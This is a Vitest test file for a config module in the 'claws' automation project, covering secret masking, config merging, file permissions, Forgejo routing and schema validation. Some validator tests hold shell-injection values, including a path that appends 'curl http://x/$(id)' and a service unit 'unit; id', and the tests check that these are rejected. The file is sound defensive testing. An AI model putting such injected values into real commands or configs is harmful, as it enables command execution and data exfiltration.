import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

// We need to test config.ts without its module-level loadConfig() interfering
// with the test environment. We'll test the exported functions by importing
// after setting up a temp directory.

const tmpDir = path.join(os.tmpdir(), "claws-config-test-" + process.pid);
const configPath = path.join(tmpDir, "config.json");

// Override WORK_DIR / CONFIG_PATH before importing config
vi.stubEnv("HOME", tmpDir.replace("/.claws", ""));

// We need to mock the os.homedir to return a temp-friendly path
vi.mock("node:os", async () => {
  const actual = await vi.importActual<typeof import("node:os")>("node:os");
  return {
    ...actual,
    default: {
      ...actual,
      homedir: () => tmpDir.replace("/.claws", "").replace(path.sep + ".claws", ""),
    },
  };
});

// Suppress the Slack webhook warning
const origWarn = console.warn;
beforeEach(() => {
  console.warn = vi.fn();
  // Clear env vars that would override config file values
  delete process.env["CLAWS_SLACK_WEBHOOK"];
  delete process.env["CLAWS_AUTH_TOKEN"];
  delete process.env["OPENAI_API_KEY"];
  delete process.env["CLAWS_GITHUB_OWNERS"];
  delete process.env["CLAWS_SELF_REPO"];
  delete process.env["WHATSAPP_ENABLED"];
  delete process.env["WHATSAPP_ALLOWED_NUMBERS"];
  delete process.env["PORT"];
  fs.mkdirSync(tmpDir, { recursive: true });
});

afterEach(() => {
  console.warn = origWarn;
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch {
    // best effort
  }
  // Clear env vars we may have set
  delete process.env["CLAWS_SLACK_WEBHOOK"];
  delete process.env["CLAWS_AUTH_TOKEN"];
  delete process.env["OPENAI_API_KEY"];
});

// We dynamically import config to get fresh state each time we need it
// But since ESM modules are cached, we'll test the functions that re-read config

describe("config", () => {
  // Use the actual module — the functions we need to test re-read config.json
  // on each call so we can control what they see via the file system.

  it("getConfigForDisplay masks sensitive fields correctly", async () => {
    const { getConfigForDisplay, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({
        slackWebhook: "https://hooks.slack.com/services/T123/B456/abcdef",
        openaiApiKey: "sk-openai-key-98765",
        authToken: "my-secret-token-xyz",
        githubOwners: ["owner1"],
        selfRepo: "owner1/repo1",
      }),
    );

    const display = getConfigForDisplay();

    // Sensitive fields should be masked (last 4 chars visible)
    expect(display.slackWebhook).toBe("****cdef");
    expect(display.openaiApiKey).toBe("****8765");

    // Non-sensitive fields should be shown as-is
    expect(display.githubOwners).toEqual(["owner1"]);
    expect(display.selfRepo).toBe("owner1/repo1");
  });

  it("getConfigForDisplay shows 'Not configured' for empty sensitive fields", async () => {
    const { getConfigForDisplay, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({}));

    // Remove env vars that would override
    delete process.env["CLAWS_SLACK_WEBHOOK"];
    delete process.env["CLAWS_AUTH_TOKEN"];
    delete process.env["OPENAI_API_KEY"];

    const display = getConfigForDisplay();
    expect(display.slackWebhook).toBe("Not configured");
    expect(display.openaiApiKey).toBe("Not configured");
  });

  it("writeConfig reads, merges, and writes config.json correctly", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ selfRepo: "old/repo", logRetentionDays: 7 }),
    );

    writeConfig({ selfRepo: "new/repo", logRetentionDays: 30 });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("new/repo");
    expect(written.logRetentionDays).toBe(30);
  });

  it("writeConfig with empty secret fields does not overwrite existing values", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ slackWebhook: "https://hooks.slack.com/existing", openaiApiKey: "existing-key" }),
    );

    writeConfig({ slackWebhook: "", openaiApiKey: "", selfRepo: "new/repo" });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.slackWebhook).toBe("https://hooks.slack.com/existing");
    expect(written.openaiApiKey).toBe("existing-key");
    expect(written.selfRepo).toBe("new/repo");
  });

  it("writeConfig deep-merges intervals", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(
      cp,
      JSON.stringify({ intervals: { issueWorkerMs: 300000, ciFixerMs: 600000 } }),
    );

    writeConfig({ intervals: { issueWorkerMs: 120000 } });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.intervals.issueWorkerMs).toBe(120000);
    expect(written.intervals.ciFixerMs).toBe(600000); // preserved
  });

  it("writeConfig handles missing config.json gracefully", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    // Ensure config.json does not exist
    try { fs.unlinkSync(cp); } catch { /* ok */ }

    writeConfig({ selfRepo: "fresh/repo" });

    const written = JSON.parse(fs.readFileSync(cp, "utf-8"));
    expect(written.selfRepo).toBe("fresh/repo");
  });

  it("writeConfig creates config.json with mode 0o600", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    // Ensure config.json does not exist
    try { fs.unlinkSync(cp); } catch { /* ok */ }

    writeConfig({ selfRepo: "fresh/repo" });

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("writeConfig tightens pre-existing config.json with loose permissions", async () => {
    const { writeConfig, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ selfRepo: "old/repo" }), { mode: 0o644 });

    writeConfig({ logRetentionDays: 30 });

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("removeConfigKeys creates config.json with mode 0o600", async () => {
    const { removeConfigKeys, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ selfRepo: "repo", slackBotToken: "token", openaiApiKey: "key" }));

    removeConfigKeys(["slackBotToken"]);

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("removeConfigKeys tightens pre-existing config.json with loose permissions", async () => {
    const { removeConfigKeys, CONFIG_PATH: cp } = await import("./config.js");

    fs.mkdirSync(path.dirname(cp), { recursive: true });
    fs.writeFileSync(cp, JSON.stringify({ selfRepo: "repo", slackBotToken: "token" }), { mode: 0o644 });

    removeConfigKeys(["slackBotToken"]);

    const stats = fs.statSync(cp);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it("reloadConfig updates exported bindings", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ selfRepo: "reloaded/repo", logRetentionDays: 42 }),
    );

    mod.reloadConfig();

    expect(mod.SELF_REPO).toBe("reloaded/repo");
    expect(mod.LOG_RETENTION_DAYS).toBe(42);
  });

  it("claudeWorkerMemoryMaxBytes falls back to 2 GiB default when env var is non-numeric", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"] = "not-a-number";
    try {
      mod.reloadConfig();
      expect(mod.CLAUDE_WORKER_MEMORY_MAX_BYTES).toBe(2_147_483_648);
    } finally {
      delete process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"];
      // Restore so subsequent tests don't see NaN
      mod.reloadConfig();
    }
  });

  it("drops a removed provider from a persisted fallback order (#2229)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ providerFallbackOrder: ["openrouter"] }),
    );

    mod.reloadConfig();

    expect(mod.PROVIDER_FALLBACK_ORDER).toEqual(["claude"]);
  });

  it("inherits a legacy toolUseProviderFallbackOrder when providerFallbackOrder is absent (#2688)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ toolUseProviderFallbackOrder: ["codex", "claude"] }),
    );

    mod.reloadConfig();

    expect(mod.PROVIDER_FALLBACK_ORDER).toEqual(["codex", "claude"]);
  });

  it("onConfigChange fires listeners after writeConfig", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    const listener = vi.fn();
    mod.onConfigChange(listener);

    mod.writeConfig({ logRetentionDays: 99 });

    expect(listener).toHaveBeenCalledTimes(1);
  });
});

describe("getIgnoredAdvisoriesForRepo", () => {
  it("merges '*' global list with per-repo list", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        dependabotIgnoredAdvisories: {
          "*": ["GHSA-aaaa-0000-0001"],
          "owner/repo": ["GHSA-bbbb-0000-0002"],
        },
      }),
    );

    mod.reloadConfig();
    const result = mod.getIgnoredAdvisoriesForRepo("owner/repo");

    expect(result).toEqual(new Set(["ghsa-aaaa-0000-0001", "ghsa-bbbb-0000-0002"]));
  });

  it("returns only global list when no repo-specific key", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        dependabotIgnoredAdvisories: {
          "*": ["GHSA-cccc-0000-0003"],
        },
      }),
    );

    mod.reloadConfig();
    const result = mod.getIgnoredAdvisoriesForRepo("owner/other-repo");

    expect(result).toEqual(new Set(["ghsa-cccc-0000-0003"]));
  });

  it("returns empty set when neither '*' nor repo key present", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    mod.reloadConfig();
    const result = mod.getIgnoredAdvisoriesForRepo("owner/repo");

    expect(result).toEqual(new Set());
  });
});

describe("Forgejo repos (#2650)", () => {
  beforeEach(() => {
    delete process.env["CLAWS_FORGEJO_REPOS"];
    delete process.env["CLAWS_FORGEJO_BASE_URL"];
    delete process.env["CLAWS_FORGEJO_TOKEN"];
  });

  afterEach(() => {
    delete process.env["CLAWS_FORGEJO_REPOS"];
    delete process.env["CLAWS_FORGEJO_BASE_URL"];
    delete process.env["CLAWS_FORGEJO_TOKEN"];
  });

  it("defaults to the perudo repo and the homelab Forgejo host with no token", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    expect(mod.FORGEJO_REPOS).toEqual(["St-John-Software/perudo"]);
    expect(mod.FORGEJO_BASE_URL).toBe("https://git.home.bstjohn.net");
    expect(mod.FORGEJO_TOKEN).toBeUndefined();
    expect(mod.isForgejoRepo("St-John-Software/perudo")).toBe(true);
    expect(mod.isForgejoRepo("St-John-Software/claws")).toBe(false);
  });

  it("reads the repo list from the config file and matches case-insensitively", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoRepos: ["Owner/Migrated"] }));
    mod.reloadConfig();

    expect(mod.isForgejoRepo("Owner/Migrated")).toBe(true);
    expect(mod.isForgejoRepo("owner/migrated")).toBe(true);
    expect(mod.isForgejoRepo("OWNER/MIGRATED")).toBe(true);
    expect(mod.isForgejoRepo("St-John-Software/perudo")).toBe(false);
  });

  it("lets CLAWS_FORGEJO_REPOS override the file, comma-split and trimmed", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoRepos: ["owner/from-file"] }));
    process.env["CLAWS_FORGEJO_REPOS"] = " owner/one , owner/two ";
    mod.reloadConfig();

    expect(mod.FORGEJO_REPOS).toEqual(["owner/one", "owner/two"]);
    expect(mod.isForgejoRepo("owner/from-file")).toBe(false);
  });

  it("forgejoRepoUrl joins the base URL and full name, stripping trailing slashes", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();
    expect(mod.forgejoRepoUrl("St-John-Software/perudo")).toBe(
      "https://git.home.bstjohn.net/St-John-Software/perudo",
    );

    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoBaseUrl: "https://forge.example.com//" }));
    mod.reloadConfig();
    expect(mod.forgejoRepoUrl("owner/repo")).toBe("https://forge.example.com/owner/repo");
  });

  it("reads the token from the config file and from the environment", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoToken: "file-token" }));
    mod.reloadConfig();
    expect(mod.FORGEJO_TOKEN).toBe("file-token");

    process.env["CLAWS_FORGEJO_TOKEN"] = "env-token";
    mod.reloadConfig();
    expect(mod.FORGEJO_TOKEN).toBe("env-token");
  });

  it("routes web/issue/PR URLs to the forge that owns the repo (#2650)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoRepos: ["owner/migrated"] }));
    mod.reloadConfig();

    expect(mod.webUrlForRepo("owner/migrated")).toBe("https://git.home.bstjohn.net/owner/migrated");
    expect(mod.issueUrl("owner/migrated", 7)).toBe("https://git.home.bstjohn.net/owner/migrated/issues/7");
    // Forgejo pull requests live at /pulls/{n}, GitHub's at /pull/{n}.
    expect(mod.prUrl("owner/migrated", 7)).toBe("https://git.home.bstjohn.net/owner/migrated/pulls/7");

    expect(mod.webUrlForRepo("owner/stays")).toBe("https://github.com/owner/stays");
    expect(mod.issueUrl("owner/stays", 7)).toBe("https://github.com/owner/stays/issues/7");
    expect(mod.prUrl("owner/stays", 7)).toBe("https://github.com/owner/stays/pull/7");
  });

  it("warns when Forgejo repos are configured but no token is set (#2670)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    expect(vi.mocked(console.warn).mock.calls.flat().join(" ")).toContain("no Forgejo token");
  });

  it("does not warn when a Forgejo token is configured (#2670)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoToken: "file-token" }));
    mod.reloadConfig();

    expect(vi.mocked(console.warn).mock.calls.flat().join(" ")).not.toContain("no Forgejo token");
  });
});

describe("PublicSnapshotSchema scrubPaths (#1962)", () => {
  it("accepts and round-trips a config file with a scrubPaths pair", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        publicSnapshots: [
          { source: "a/b", target: "c/d", scrubPaths: ["apps/authentik/configmap-blueprints.yaml"] },
        ],
      }),
    );

    mod.reloadConfig();

    expect(mod.PUBLIC_SNAPSHOTS).toEqual([
      { source: "a/b", target: "c/d", scrubPaths: ["apps/authentik/configmap-blueprints.yaml"] },
    ]);
  });

  it("rejects a pair combining mirrorReleases with a non-empty scrubPaths", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");

    const result = PublicSnapshotSchema.safeParse({
      source: "a/b",
      target: "c/d",
      mirrorReleases: true,
      scrubPaths: ["x"],
    });

    expect(result.success).toBe(false);
  });

  it("accepts mirrorReleases alone and scrubPaths alone", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");

    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", mirrorReleases: true }).success).toBe(true);
    expect(PublicSnapshotSchema.safeParse({ source: "a/b", target: "c/d", scrubPaths: ["x"] }).success).toBe(true);
  });

  it("accepts a valid https releaseAssetUrl and rejects an invalid one (#2115)", async () => {
    const { PublicSnapshotSchema } = await import("./config.js");

    expect(
      PublicSnapshotSchema.safeParse({
        source: "a/b", target: "c/d", mirrorReleases: true, releaseAssetUrl: "https://x/y-{version}.dmg",
      }).success,
    ).toBe(true);
    expect(
      PublicSnapshotSchema.safeParse({
        source: "a/b", target: "c/d", mirrorReleases: true, releaseAssetUrl: "http://x/y.dmg",
      }).success,
    ).toBe(false);
  });
});

describe("RunnerHostSchema actionsDir validation", () => {
  it("accepts a valid absolute path", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions/actions-runner" }).success).toBe(true);
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/opt/runner_2.0" }).success).toBe(true);
  });

  it("rejects a path with shell injection characters", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/home/actions; curl http://x/$(id) #" }).success).toBe(false);
  });

  it("rejects a relative path", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "relative/path" }).success).toBe(false);
  });

  it("rejects a path with spaces", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a b" }).success).toBe(false);
  });

  it("rejects a path with backtick", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a`b" }).success).toBe(false);
  });

  it("rejects a path with ampersands", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h", actionsDir: "/a&&b" }).success).toBe(false);
  });

  it("accepts a valid systemd entry", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({
      host: "h",
      serviceUnit: "github-runner-beefy-actions",
      workDir: "/var/lib/github-runner-beefy-actions-work",
      toolDir: "/var/lib/github-runner-beefy-actions-tool",
    }).success).toBe(true);
  });

  it("rejects a systemd entry missing toolDir", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({
      host: "h",
      serviceUnit: "github-runner-beefy-actions",
      workDir: "/var/lib/github-runner-beefy-actions-work",
    }).success).toBe(false);
  });

  it("rejects an unsafe serviceUnit", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({
      host: "h",
      serviceUnit: "unit; id",
      workDir: "/var/lib/github-runner-beefy-actions-work",
      toolDir: "/var/lib/github-runner-beefy-actions-tool",
    }).success).toBe(false);
  });

  it("rejects an entry with neither actionsDir nor serviceUnit", async () => {
    const { RunnerHostSchema } = await import("./config.js");
    expect(RunnerHostSchema.safeParse({ host: "h" }).success).toBe(false);
  });
});

describe("LABEL_SPECS", () => {
  it("keeps every description within GitHub's 100-character label limit and every color a valid hex", async () => {
    const { LABEL_SPECS } = await import("./config.js");
    for (const [name, spec] of Object.entries(LABEL_SPECS)) {
      expect(spec.description.length, `${name} description is ${spec.description.length} chars`).toBeLessThanOrEqual(100);
      expect(spec.color, `${name} color is "${spec.color}"`).toMatch(/^[0-9a-f]{6}$/);
    }
  });
});

describe("parseOidcHostMap (#2841)", () => {
  it("parses a single host=url pair", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("claws.ext.bstjohn.net=https://auth.ext.bstjohn.net")).toEqual({
      "claws.ext.bstjohn.net": "https://auth.ext.bstjohn.net",
    });
  });

  it("parses multiple comma-separated pairs", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(
      parseOidcHostMap(
        "claws.ext.bstjohn.net=https://auth.ext.bstjohn.net,other.example=https://auth.other.example",
      ),
    ).toEqual({
      "claws.ext.bstjohn.net": "https://auth.ext.bstjohn.net",
      "other.example": "https://auth.other.example",
    });
  });

  it("normalises a scheme-prefixed, port-suffixed, uppercase key to a bare lowercase host", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(
      parseOidcHostMap("HTTPS://Claws.Ext.Bstjohn.Net:443=https://auth.ext.bstjohn.net"),
    ).toEqual({
      "claws.ext.bstjohn.net": "https://auth.ext.bstjohn.net",
    });
  });

  it("normalises a value with a trailing slash and path to its origin", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(
      parseOidcHostMap("claws.ext.bstjohn.net=https://auth.ext.bstjohn.net/some/path/"),
    ).toEqual({
      "claws.ext.bstjohn.net": "https://auth.ext.bstjohn.net",
    });
  });

  it("drops an entry with no '=' without throwing", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("claws.ext.bstjohn.net")).toEqual({});
  });

  it("drops an entry with an empty key without throwing", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("=https://auth.ext.bstjohn.net")).toEqual({});
  });

  it("drops an entry with a non-URL value without throwing", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("claws.ext.bstjohn.net=not-a-url")).toEqual({});
  });

  it("returns {} for empty or whitespace input", async () => {
    const { parseOidcHostMap } = await import("./config.js");
    expect(parseOidcHostMap("")).toEqual({});
    expect(parseOidcHostMap("   ")).toEqual({});
  });
});
